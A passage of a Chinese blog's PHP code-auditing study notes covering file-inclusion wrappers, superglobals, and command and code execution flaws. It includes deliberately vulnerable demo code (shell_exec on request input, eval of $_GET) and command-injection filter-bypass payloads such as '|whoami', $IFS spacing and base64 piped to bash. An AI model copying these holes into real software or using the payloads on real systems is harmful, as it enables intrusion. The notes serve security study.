+<ul>
+<li>作用: 常规url格式，允许<code>http 1.0</code>的GET方法，以只读访问文件或资源换。CTF常用于远程文件包含</li>
+<li>用法</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>示例</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.31.22.30/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105851296.png" alt="image-20211025105851296"></p>
+<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h4><p>phar:// 协议与zip协议类似，同样可以访问zip格式的压缩包内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:<span class="comment">//D:\phpstudy_pro\WWW\phplearn\phpinfo.zip\phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025110236065.png" alt="image-20211025110236065"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP代码审计学习-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/" class="article-date">
+      <time datetime="2021-10-24T02:26:22.000Z" itemprop="datePublished">2021-10-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/">PHP代码审计学习其一</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h4 id="审计时可能会涉及到的超全局变量"><a href="#审计时可能会涉及到的超全局变量" class="headerlink" title="审计时可能会涉及到的超全局变量"></a>审计时可能会涉及到的超全局变量</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$_ENV</span>;</span><br><span class="line"><span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$_SESSION</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h4 id="各个变量作用说明"><a href="#各个变量作用说明" class="headerlink" title="各个变量作用说明"></a>各个变量作用说明</h4><p>(1) $GLOBALS 引用全局作用域中可用的全部变量</p>
+<p>在一个php脚本的全部作用域全都可以访问到，$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+<p>(2) $_SERVER</p>
+<p>是一个包含了诸如头信息（header）、路径(path)、以及脚本位置(script locations) 等等信息的数组。这个数组中的项目由web服务器创建。不能保证每个服务器都会提供给我们完整的信息；服务器可能会忽略一些，也可能会提供一些没有列举在此处的信息给我们。</p>
+<p>以下列出了所有$_SERVER变量中的重要元素：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] <span class="comment">#当前正在执行 脚本的文件名，与 document root相关。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>] <span class="comment">#传递给该 脚本的参数。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>] <span class="comment">#包含传递给程序的 命令行参数的个数（如果运行在命令行模式）。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>] <span class="comment">#服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] <span class="comment">#当前 运行脚本所在服务器 主机的名称。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>] <span class="comment">#服务器标识的字串，在响应请求时的头部中给出。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>] <span class="comment">#请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] <span class="comment">#访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] <span class="comment">#查询(query)的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] <span class="comment">#当前 运行脚本所在的文档根目录。在服务器配置文件中定义。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] <span class="comment">#当前请求的 Accept: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_CHARSET&#x27;</span>] <span class="comment">#当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_ENCODING&#x27;</span>] <span class="comment">#当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]<span class="comment">#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>] <span class="comment">#当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] <span class="comment">#当前请求的 Host: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_REFERER&#x27;</span>] <span class="comment">#链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_USER_AGENT&#x27;</span>] <span class="comment">#当前请求的 User-Agent: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 IP 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 主机名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>] <span class="comment">#用户连接到服务器时所使用的端口。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>] <span class="comment">#当前执行 脚本的 绝对路径名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>] <span class="comment"># 管理员信息</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] <span class="comment">#服务器所使用的端口</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SIGNATURE&#x27;</span>] <span class="comment">#包含服务器版本和 虚拟主机名的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>] <span class="comment">#当前 脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] <span class="comment">#包含当前 脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] <span class="comment">#访问此页面所需的 URI。例如，“/index.html”</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) $_REQUEST</p>
+<p>用于收集HTML当中提交的数据，无论$_GET、$_POST或其他方式均可接受到，我们可以用$_REQUEST来收集表单中所提交的信息。</p>
+<p>(4) $_POST</p>
+<p>应用于提交表单，或复杂信息。</p>
+<p>(5) $_GET</p>
+<p>可用于提交表单，或提交简单信息于服务器，可在<form method="GET">处设置</form></p>
+<p>(6) $_FILES</p>
+<p>获取文件 </p>
+<p>演示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;heade&gt;</span><br><span class="line"></span><br><span class="line">&lt;/heade&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;global.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;fileupload&quot;</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;send file&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $GLOBALS 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;foo&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in local scope: &#x27;</span>.<span class="variable">$foo</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;globals variable&quot;</span>;</span><br><span class="line"><span class="comment">#此处可以见得，由$AGLOBALS调用的foo变量是全局变量</span></span><br><span class="line"><span class="comment">#在foo函数内直接调用的$foo变量是局部变量</span></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用var_dump递归的打印$_SERVER中存储的服务器信息</span></span><br><span class="line"><span class="comment">#var_dump($_SERVER);</span></span><br><span class="line"><span class="comment">#打印输出当前php文件在服务器上的根目录</span></span><br><span class="line"></span><br><span class="line">print_r(<span class="string">&#x27;PATH_TRANSLATED:&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_GET[a]:&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_POST[b]:&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST[c]:&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$_FILES 是一个预定义数组，用来获取通过POST方式上传文件的相关信息。如果为单个文件单独上传，那么$_FILES 为二维数组；如果为多个文件上传，那么￥FILES为三维数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿到上传文件进行打印</span></span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111608484.png" alt="image-20211024111608484"></p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111557690.png" alt="image-20211024111557690"></p>
+<h4 id="简单命令执行漏洞分析"><a href="#简单命令执行漏洞分析" class="headerlink" title="简单命令执行漏洞分析"></a>简单命令执行漏洞分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="常见php命令执行函数"><a href="#常见php命令执行函数" class="headerlink" title="常见php命令执行函数"></a>常见php命令执行函数</h5><p>exec()、 system() 、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec()、反引号` 实际上是使用shell_exec()函数</p>
+<p>system()输出并返回最后一行shell的结果</p>
+<p>exec()不输出结果，返回最后一行shell的结果，所有结果可以保存到一个返回的数组里。</p>
+<p>passthru() 只调用命令，把命令的运行结果原封不动的输出到标准输出设备上</p>
+<p>popen()、proc_open() 不会直接返回执行结果、而是返回一个文件指针</p>
+<h5 id="漏洞利用以及绕过姿势："><a href="#漏洞利用以及绕过姿势：" class="headerlink" title="漏洞利用以及绕过姿势："></a>漏洞利用以及绕过姿势：</h5><p>各种逻辑运算符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">| 将前者的执行结果作为参数交给后者进行执行</span><br><span class="line">|| 前面出错执行后面的 ping xxx||whoami</span><br><span class="line">&amp; 前面为真为假不影响后面命令的执行</span><br><span class="line">&amp;&amp; 前面的为假后面的不执行，前面只可为真。</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p><strong>针对空格过滤:</strong></p>
+<blockquote>
+<p>$IFS绕过 </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls$IFS-la</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024135433323.png" alt="image-20211024135433323"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;或者&lt;&gt;绕过</span><br><span class="line">cat&gt;test.sql</span><br><span class="line">cat&lt;&gt;test.sql</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>php环境下(%09)</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09test.sql</span><br></pre></td></tr></table></figure>
+
+<p><strong>消除后缀的影响</strong></p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>.<span class="string">&#x27;.com&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行命令时虽没有任何过滤，但会在我们输入的命令后拼接上.com，如果我们不做处理的话，执行的命令将会失去我们原来的含义，因此，我们要提前将后面的尾缀(.com)截断</p>
+<blockquote>
+<p>%00截断</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wadwad|whoami%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024140510347.png" alt="image-20211024140510347"></p>
+<blockquote>
+<p>%20%23</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wdad|ls%<span class="number">20</span>%<span class="number">23</span> <span class="comment">#也就是空格# 将后面的字符注释掉</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>黑名单绕过</strong></p>
+<blockquote>
+<p>拼接字符</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=test.sql;$a<span class="variable">$b</span> <span class="variable">$c</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>编码绕过</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wad |echo &#x27;d2hvYW1p&#x27;|base64 -d |bash</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>单双引号</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t tes<span class="string">&quot;&quot;</span>t.sql</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反斜杠利用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat test.sql</span><br><span class="line">c\a\t te\s\t.sql</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通配符绕过黑名单限制</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个?代表一个字符，*代表若干字符</span><br><span class="line">/bin/cat test.sql</span><br><span class="line">/bin/c?t tes?.sq? #会输出许多内容，其中包括test.sql的内容</span><br></pre></td></tr></table></figure>
+
+<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="常见危险函数-assert与eval"><a href="#常见危险函数-assert与eval" class="headerlink" title="常见危险函数(assert与eval)"></a>常见危险函数(assert与eval)</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">   print_r(<span class="variable">$cmd</span>);</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;\$cmd = <span class="subst">$cmd</span>&quot;</span>);<span class="comment">//assret()函数也是一样的，这里没对用户输入做过滤</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;not&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="常见回调函数"><a href="#常见回调函数" class="headerlink" title="常见回调函数"></a>常见回调函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常用回调函数有： </span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);	<span class="comment">#第一个参数是会回调函数 第二个参数视为回调函数的参数</span></span><br><span class="line">call_user_func_array(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br><span class="line">array_map(evil,<span class="keyword">array</span>(<span class="variable">$cmd</span>)); <span class="comment">#第一个参数视为回调函数 第二个参数`数组`视为回调函数的参数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#call_user_func(callable $callback , mixed $Parameter，mixed $xxx)</span></span><br><span class="line"><span class="comment">#第一个参数$callback是被调用的回调函数，剩下的参数是回调函数的参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#写一个回调函数小demo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"><span class="variable">$Parameter</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$Parameter</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Parameter</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">call_user_func(evil,<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024144125269.png" alt="image-20211024144125269"></p>
+<h5 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h5><p>定义一个函数，将想要调用的变量名赋值给字符串，使用变量名代替函数名动态调用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#需求： 写一个利用字符串来调用exec的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Callme</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Parameter1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$Parameter2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span 